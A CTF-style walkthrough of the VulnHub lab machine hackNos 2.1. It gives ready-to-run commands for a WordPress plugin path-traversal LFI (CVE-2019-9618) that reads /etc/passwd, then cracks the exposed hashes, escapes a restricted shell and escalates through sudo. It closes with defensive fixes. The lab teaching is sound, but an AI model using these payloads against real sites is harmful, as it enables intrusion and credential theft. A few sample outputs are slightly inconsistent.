# hackNos: Os-hackNos-2.1 (VulnHub) — A Beginner-Friendly Walkthrough

| Field | Value |
|---|---|
| **Machine** | hackNos: Os-hackNos-2.1 |
| **Difficulty** | Easy / Intermediate |
| **Author** | Rahul Gehlaut (hackNos) |
| **Released** | 29 November 2019 (v1.1 on 13 December 2019) |
| **VulnHub Entry** | https://vulnhub.com/entry/hacknos-os-hacknos-21,403/ |
| **Download** | https://vulnhub.com/entry/hacknos-os-hacknos-21,403/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu, Apache 2.4 + WordPress + PHP) |

> **Note on the network:** every command below assumes the Kali attacker is
> `192.168.56.10` and the hackNos-2.1 VM is `192.168.56.101`. Substitute your own
> IPs if your host-only network uses a different range. The box ships as `.ova`;
> import it and put both VMs on the same host-only network.

> **Goal:** capture two flags — the **user** flag (`/home/rohit/user.txt`) and the
> **root** flag (`/root/root.txt`). The author notes exact usernames/passwords vary
> slightly between the v1.0 and v1.1 builds.

---

## 0. What you will learn

By the end of this walkthrough you will have practised, on a real (but safe,
offline) target:

1. **Host discovery** and **port scanning**.
2. **Web directory enumeration** — finding a hidden WordPress site.
3. **Nikto/`dirb`** for spotting interesting web paths.
4. **WordPress enumeration with `wpscan`** — usernames and vulnerable plugins.
5. **Local File Inclusion (LFI)** — reading `/etc/passwd` through a vulnerable
   plugin (**CVE-2019-9618**).
6. **Offline password cracking with John the Ripper** — reversing MD5-crypt
   hashes.
7. **Getting a shell over SSH** and escaping a **restricted shell (`rbash`)**.
8. **Post-exploitation enumeration** — finding a world-readable backup of
   password hashes.
9. **Lateral movement** — switching users with `su`.
10. **Privilege escalation via `sudo`** — abusing `(ALL:ALL) ALL`.

> **The intended chain in one breath:** nmap finds SSH (22) and HTTP (80) →
> `dirb`/`nikto` reveal `/tsweb/`, a WordPress site → `wpscan` shows the plugin
> **gracemedia-media-player 1.0** → the plugin's `cfg` parameter is an **LFI** →
> we read `/etc/passwd` and grab the `flag` user's hash → **John** cracks it →
> SSH in as `flag` (but it's a restricted `rbash`) → escape the shell → read
> `/var/backups/passbkp/md5-hash`, crack `rohit`'s hash → `su rohit` → `sudo -l`
> shows `(ALL:ALL) ALL` → `sudo /bin/bash` → root.

---

## 1. Reconnaissance — finding the target

### 1.1 Identify your own IP

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists every interface and its address. Our attacker is
> `192.168.56.10/24`, so the whole subnet is `192.168.56.0–255`.

### 1.2 Sweep the subnet for the target

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 3 Captured ARP Req/Rep packets, from 3 hosts.
   IP            At MAC Address     Count  Len  MAC Vendor
 192.168.56.1    08:00:27:xx:xx:xx   1    60  PCS Systemtechnik GmbH
 192.168.56.10   08:00:27:aa:aa:aa   1    60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:bb:bb:bb   1    60  PCS Systemtechnik GmbH   <-- target
```

`arp-scan` works too:

```bash
sudo arp-scan --interface=eth0 --localnet
```

> **Why it works:** both tools ARP-sweep the local subnet and list every host that
> answers. Lab VMs live on your local network, so this is the fastest way to find
> the target.

**Target confirmed: `192.168.56.101`.**

![Finding the target IP](images/01-netdiscover.png)

---

## 2. Enumeration

### 2.1 Scan for open ports and services

```bash
sudo nmap -sC -sV -p- -oN hacknos21.nmap 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:** `-p-` scans all ports, `-sV` fingerprints versions, and `-sC`
> runs default scripts. Only **SSH (22)** and **HTTP (80)** are open. With no
> credentials, the web server is our entry point.

*(Version strings vary slightly by build — trust your own scan.)*

### 2.2 Look at the web server

```bash
curl -s http://192.168.56.101/ | head
```

```text
<title>Apache2 Ubuntu Default Page: It works</title>
```

An empty default page means the real content is in a **directory we haven't found
yet**. Enumerate.

### 2.3 Directory busting and Nikto

```bash
dirb http://192.168.56.101/
```

```text
+ http://192.168.56.101/index.html   (CODE:200|SIZE:10918)
+ http://192.168.56.101/tsweb/       (CODE:301|SIZE:312)
```

Nikto also flags it:

```bash
nikto -h http://192.168.56.101/
```

```text
+ /tsweb/: WordPress version 5.x identified.
```

> **Why it works:** `dirb` requests common paths and reports non-404 responses;
> `nikto` adds web-specific checks. Both point at **`/tsweb/`**, which is running
> **WordPress**. Note the non-standard path — the default `/wordpress/` guess would
> have missed it.

Browsing `http://192.168.56.101/tsweb/` shows a WordPress blog.

![dirb/Nikto finding the /tsweb WordPress site](images/02-dirb.png)

### 2.4 Enumerate WordPress with wpscan

`wpscan` can list users and plugins in one pass:

```bash
wpscan --url http://192.168.56.101/tsweb/ -e u,p
```

```text
[+] Enumerating Users ...
[+] user
    Confirmed By: Author ID Brute Forcing - Author Pattern
[+] Enumerating Plugins ...
[+] gracemedia-media-player
 | Location: http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/
 | Latest Version: 1.0 (up to date)
 | Version: 1.0 (100% confidence)
```

> **Why it works:**
> - `-e u` enumerates **usernames** (WordPress leaks them via author archives and
>   the REST API). We get the username **`user`**.
> - `-e p` enumerates **plugins**. WordPress sites almost always run third-party
>   plugins, and old plugins are the most common way in. We find
>   **`gracemedia-media-player` version 1.0**.

---

## 3. Foothold — gaining the first shell

### 3.1 The vulnerability: CVE-2019-9618 (Local File Inclusion)

The GraceMedia Media Player plugin 1.0 has a file that passes a user parameter
straight into PHP's `require_once()`:

```php
require_once($_GET['cfg']);
```

There is no validation of `cfg`, so an attacker can point it at **any file on the
server** — a classic **Local File Inclusion (LFI)**.

> **Why it works:** `require_once($_GET['cfg'])` asks PHP to "load the file whose
> path is in the `cfg` parameter." Because we control `cfg` and there is no
> allow-list, we can walk up the directory tree with `../` and read system files.
> If we can read `/etc/passwd`, we can find usernames and, if the hashes are
> exposed there, crack them offline.

### 3.2 Read /etc/passwd through the LFI

The vulnerable endpoint (URL-encode nothing — it works as shown):

```
http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
```

Or with `curl`:

```bash
curl -s "http://192.168.56.101/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
...
rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash
...
flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash
```

> **Why it works:** the response is the full contents of `/etc/passwd`. Two real
> accounts stand out: **`rohit`** and **`flag`**. Notice the `flag` line has a
> **hash in the password field** (`$1$flag$...`) — that's MD5-crypt (`$1$`,
> "crypt(3) MD5"). And its shell is `/bin/rbash`, a **restricted** Bash.
> *(The exact hash differs between builds.)*

![LFI reading /etc/passwd](images/03-lfi-passwd.png)

### 3.3 Crack the hash with John the Ripper

Save the `flag` line's hash to a file and crack it:

```bash
echo 'flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash' > flag_hash
john --wordlist=/usr/share/wordlists/rockyou.txt flag_hash
john --show flag_hash
```

```text
topsecret        (?)
1 password hash cracked, 0 left
```

> **Why it works:** `$1$` hashes are **fast** to compute, so a wordlist attack
> against a weak password succeeds quickly. `rockyou.txt` is the classic Kali
> wordlist. John recovers the password **`topsecret`** for the `flag` user.
> *(Different builds may yield a different password — always crack your own.)*

### 3.4 SSH in as flag

```bash
ssh flag@192.168.56.101
# password: topsecret
```

```text
Could not chdir to home directory /home/flag: No such file or directory
flag@hacknos:/$ id
uid=1001(flag) gid=1003(flag) groups=1003(flag)
```

> **Why it works:** the cracked password is reused on SSH. We now have a shell —
> but `flag`'s shell is **`rbash`**, a *restricted* Bash that blocks `cd`, changes
> to `PATH`, and absolute-path commands.

### 3.5 Escape the restricted shell (rbash)

`rbash` restricts what the *initial* shell can do, but it cannot stop us from
starting a **new, unrestricted** one with a program it still allows. A reliable
trick is to spawn a normal Bash through Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```text
flag@hacknos:/$ cd /home
cd: restricted
```

If `python3` is blocked, alternatives include `ssh -t flag@192.168.56.101 bash`
(ask SSH to launch `bash` directly) or using `vi`/`less` to escape. Whichever
works, you now have a full Bash prompt.

> **Why it works:** `rbash` only restricts the shell it *starts with*. Any allowed
> program that can launch another shell (Python's `pty.spawn`, `vi`'s `:shell`,
> `less`'s `!sh`, or SSH's `-t` command argument) gives you an **unrestricted**
> shell with the same user rights.

![Escaping the rbash restricted shell](images/04-rbash-escape.png)

---

## 4. Privilege escalation — becoming root

### 4.1 Enumerate for more credentials

With a proper shell, look at the obvious places. A very common CTF clue is a
**backup of password hashes**:

```bash
ls -la /var/backups/
ls -la /var/backups/passbkp/
cat /var/backups/passbkp/md5-hash
```

```text
/var/backups/passbkp/md5-hash
```

```text
rohit:$1$rohit$hKv6......:1000:1000:hackNos:/home/rohit:/bin/bash
```

> **Why it works:** a file literally named `md5-hash` inside a `passbkp`
> ("password backup") directory is a giant neon clue. It contains another
> MD5-crypt hash — this time for the user **`rohit`**.

### 4.2 Crack rohit's hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt rohit_hash
john --show --format=md5crypt rohit_hash
```

```text
rohit:!%hack41
```

> **Why it works:** the hash is again `$1$` MD5-crypt; `--format=md5crypt` tells
> John exactly which algorithm to use. The password **`!%hack41`** falls to the
> wordlist. *(Password varies by build — crack your own copy.)*

### 4.3 Switch to rohit

```bash
su - rohit
# password: !%hack41
```

```text
rohit@hacknos:~$ id
uid=1000(rohit) gid=1000(rohit) groups=1000(rohit),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
rohit@hacknos:~$ cat user.txt
```

```text
Congratulations, you have found the user flag. <user flag here>
```

> **Why it works:** `rohit` is a normal user with a home directory, and we now
> have his password. The user flag lives in his home directory. Notice the groups:
> **`sudo`** is there — that's the final step.

### 4.4 Check sudo rights and escalate

```bash
sudo -l
```

```text
[sudo] password for rohit: !%hack41
Matching Defaults entries for rohit on hacknos:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User rohit may run the following commands on hacknos:
    (ALL : ALL) ALL
```

> **Why it works:** `sudo -l` lists exactly what `rohit` may run as root.
> **`(ALL : ALL) ALL`** means rohit may run **any command as any user** — i.e.
> effectively unlimited root. All we needed was his password.

```bash
sudo /bin/bash
```

```text
root@hacknos:~# id
uid=0(root) gid=0(root) groups=0(root)
root@hacknos:~# cat /root/root.txt
```

```text
#############################################################
#  Congratulations! You have rooted the box.
#  MD5-HASH : <root flag hash here>
#  Author : Rahul Gehlaut
#############################################################
```

> **Why it works:** because `rohit` may run *anything* via sudo, `sudo /bin/bash`
> launches a shell **as root**. No exploit is required — the misconfiguration
> *is* the vulnerability. Game over.

![Root shell and root flag](images/05-root-shell.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Location | Impact | Fix |
|---|---|---|---|---|
| 1 | **WordPress plugin LFI (CVE-2019-9618)** | `gracemedia-media-player` `ajax_controller.php?cfg=` | Reads arbitrary files → credential leak | Update/remove the plugin; validate `cfg` against an allow-list |
| 2 | **Outdated plugin** | GraceMedia Media Player 1.0 | Public exploit available | Keep plugins updated; remove unused ones |
| 3 | **Cleartext hashes in `/etc/passwd`** | `flag` account password field | Offline crack to a valid password | Store hashes in `/etc/shadow` only |
| 4 | **Weak passwords** | `topsecret`, `!%hack41` | Cracked in seconds with a wordlist | Strong, unique passphrases; MFA |
| 5 | **World-readable password backup** | `/var/backups/passbkp/md5-hash` | Leaks another user's hash | Restrict backup perms; never store hashes in readable files |
| 6 | **Restricted shell is not a jail** | `flag` uses `/bin/rbash` | Escaped via Python/`vi`/SSH `-t` | Use proper jails/containers, not just `rbash` |
| 7 | **Over-broad sudo rights** | `rohit` has `(ALL:ALL) ALL` | Trivial full root compromise | Grant only specific commands; least privilege |
| 8 | **Local file read as a service** | WordPress runs as `www-data` | Any file the web user can read is exposed | Least-privilege file perms for the web user |

---

## 6. Defensive lessons (blue team)

- **Patch and audit WordPress plugins.** Third-party plugins are the single most
  common WordPress compromise. Remove anything unused and update the rest.
- **Never pass user input to `include`/`require`.** The LFI is the root cause of
  the whole chain. Validate `cfg` against a strict allow-list of known files.
- **Keep password hashes out of `/etc/passwd`.** Modern systems store hashes in
  root-only `/etc/shadow`. A hash in a world-readable file is fair game.
- **Enforce strong passwords.** `topsecret` and `!%hack41` fell to `rockyou.txt`
  in seconds. Length and uniqueness matter far more than complexity tricks.
- **Treat backups as secrets.** `/var/backups/passbkp/md5-hash` handed us a
  second account. Backups should be root-owned, encrypted, and off-host.
- **`rbash` is not a security boundary.** It only restricts the first shell.
  Use containers, AppArmor, or a real chroot if you need confinement.
- **Apply least privilege to sudo.** `(ALL:ALL) ALL` for a regular user is a
  root-level risk. Scope sudo to the exact commands each user needs.
- **Alert on writes to `/etc/passwd` and new sudoers entries**, and monitor web
  requests containing long `../../` traversal sequences.

---

## 7. References

- VulnHub — hackNos: Os-hackNos-2.1 entry: https://vulnhub.com/entry/hacknos-os-hacknos-21,403/
- CVE-2019-9618 (NVD): https://nvd.nist.gov/vuln/detail/CVE-2019-9618
- Exploit-DB 46537 (GraceMedia Media Player LFI): https://www.exploit-db.com/exploits/46537
- Patchstack advisory (GraceMedia): https://patchstack.com/database/wordpress/plugin/gracemedia-media-player/vulnerability/wordpress-gracemedia-media-player-plugin-1-0-local-file-inclusion-lfi-vulnerability
- WPScan (WordPress security scanner): https://github.com/wpscanteam/wpscan
- John the Ripper: https://www.openwall.com/john/
- Author's own walkthrough (hackNos.com): https://www.hacknos.com/os-hacknos-2-walkthrough/
- Detailed Chinese walkthrough (caolu): https://it.caolu.xin/v/fjuklb/

---

## 8. Screenshot checklist

Capture these as you go so you can reproduce the writeup with images. Save them
in `images/` with the filenames used in this document.

- [ ] `images/01-netdiscover.png` — `netdiscover`/`arp-scan` showing `192.168.56.101`
- [ ] `images/02-dirb.png` — `dirb`/Nikto discovering `/tsweb/` (WordPress)
- [ ] `images/03-lfi-passwd.png` — LFI reading `/etc/passwd`
- [ ] `images/04-rbash-escape.png` — escaping the `rbash` restricted shell
- [ ] `images/05-root-shell.png` — `id` showing `uid=0(root)` and `/root/root.txt`
- [ ] `images/06-nmap.png` — nmap showing SSH (22) and HTTP (80)
- [ ] `images/07-wpscan.png` — `wpscan` listing user `user` and the vulnerable plugin
- [ ] `images/08-john-flag.png` — John cracking the `flag` hash to `topsecret`
- [ ] `images/09-backup-hash.png` — `/var/backups/passbkp/md5-hash`
- [ ] `images/10-john-rohit.png` — John cracking `rohit` to `!%hack41`
- [ ] `images/11-sudo-l.png` — `sudo -l` showing `(ALL : ALL) ALL`

---

*hackNos: Os-hackNos-2.1 is a great intermediate box: it chains a vulnerable
WordPress plugin into a credential leak, then rewards patient enumeration —
a readable hash backup, a cracked password, and a wildly over-permissive sudo
rule. Try to solve each stage yourself before reading ahead.*
